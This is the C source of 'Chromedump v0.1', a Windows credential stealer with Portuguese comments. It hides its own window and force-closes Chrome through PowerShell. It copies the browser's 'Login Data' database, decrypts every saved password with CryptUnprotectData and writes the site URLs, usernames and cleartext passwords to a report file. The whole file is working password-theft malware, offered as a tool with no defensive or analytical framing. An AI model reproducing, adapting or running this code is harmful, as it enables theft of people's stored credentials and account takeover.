/*
*   Chromedump v0.1
*
*   Captura todas as senhas salvas pelo google chrome.
*   By: Zer0
*
*   Leia o README.md para informações de compilação e outras informações.
*/

#pragma comment(lib, "Crypt32")

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wincrypt.h>
#include "sqlite3.h"

#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)

// Estruturas usadas para obter a senha
DATA_BLOB SenhaCriptografada, SenhaDecriptografada;

// Nome do arquivo de saida e nome do banco de dados
const char *nome_arq = "ChromeReport.txt";
const char *novo_db = "CryptDB";

// Funções
int copia_db(char *path);

int main(int argc , char *argv[])
{
    // Executa o programa em background
    ShowWindow(GetForegroundWindow(),SW_HIDE);

    // Variaveis
    int status;
    char *query , *resultado , diretorio[255];

    // Necessario para manipular o banco de dados
    sqlite3_stmt *stmt; 
    sqlite3 *handle;

    // Pega o nome de usuario para gravar no arquivo
    char usuario[50];
    DWORD size_user = 50;
    GetUserName(usuario, &size_user);

    // Cria o diretorio ate o banco de dados
    char *Userprofile; Userprofile = getenv("USERPROFILE");
    sprintf(diretorio , "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", Userprofile);

    // Cria o arquivo para gravar os dados
    FILE *arq = fopen(nome_arq , "w");
    fprintf(arq , "Chrome report PC: %s\n\n" , usuario);

    // Fecha o chrome para copiar o banco de dados
    system("powershell Stop-Process -Name chrome"); 

    // Copia e abre o banco de dados
    status = copia_db(diretorio);
    if(status == 0) status = sqlite3_open(novo_db,&handle);
    else status = sqlite3_open(diretorio,&handle);
    if(status)
    {
        fprintf(arq, "%s - Perfil: %s\n" , "> Erro ao abrir banco de dados",Userprofile);
        return 1;
    }

    // Busca url , usuario e senha no banco de dados
    query = "SELECT origin_url, username_value, password_value from logins";
    status = sqlite3_prepare_v2(handle,query ,-1,&stmt,0);
    if(status)
    {
        fprintf(arq, "%s" , "> Erro ao encontrar dados em logins\n");
        return 1;
    }

    while(1)
    {
        // Pega o status atual
        status = sqlite3_step(stmt);
        if(status == SQLITE_ROW)
        {
            // Url
            resultado = (char *)sqlite3_column_text(stmt,0);
            fprintf(arq,"%s = %s\n",sqlite3_column_name(stmt,0),resultado);

            // Usuario
            resultado = (char *)sqlite3_column_text(stmt,1);
            fprintf(arq,"%s = %s\n",sqlite3_column_name(stmt,1),resultado);

            // Obtem a senha criptografada 
            SenhaCriptografada.cbData = (DWORD)sqlite3_column_bytes(stmt, 2);
		    SenhaCriptografada.pbData = (BYTE *)sqlite3_column_blob(stmt, 2);

            // Decriptografa a senha
            CryptUnprotectData(&SenhaCriptografada,NULL,NULL,NULL,NULL,0,&SenhaDecriptografada);

            // Grava a senha no arquivo
            resultado = (char *)SenhaDecriptografada.pbData;
            int size_senha = (int)SenhaDecriptografada.cbData;
            fprintf(arq , "%s = ",sqlite3_column_name(stmt,2));
            for(int i = 0; i <size_senha ;++i) fputc(resultado[i] , arq); // Copia a senha para o arquivo
            fprintf(arq , "%s" , "\n\n");

        }
        else if(status == SQLITE_DONE) break;
        else 
        {
            fprintf(arq, "%s" , "> Ocorreu um erro na leitura\n");
            break;
        }

    }

    // Fim
    sqlite3_close(handle);
    fclose(arq);
    return 0;
}

// Copia o banco de dados para o diretorio local
int copia_db(char *path)
{
    long int size_return;
    long int len = 1024 * 10 * 10;
    char *buffer = malloc(len);

    // Abre o banco de dados para leitura
    FILE *in = fopen(path , "rb");
    if(in == NULL) return 1;

    // Cria o arquivo para o novo banco de dados
    FILE *out = fopen(novo_db , "wb");
    if(out == NULL) return 1;

    // Copia o arquivo
    while((size_return = fread(buffer ,1 , len , in)) > 0) 
    {
        if(size_return < 0)
        {
            fclose(out);
            fclose(in);
            free(buffer);
            return 1;
        }
        fwrite(buffer , 1 , size_return , out);
    }

    // Fim
    fclose(out);
    fclose(in);
    free(buffer);
    return 0;
}
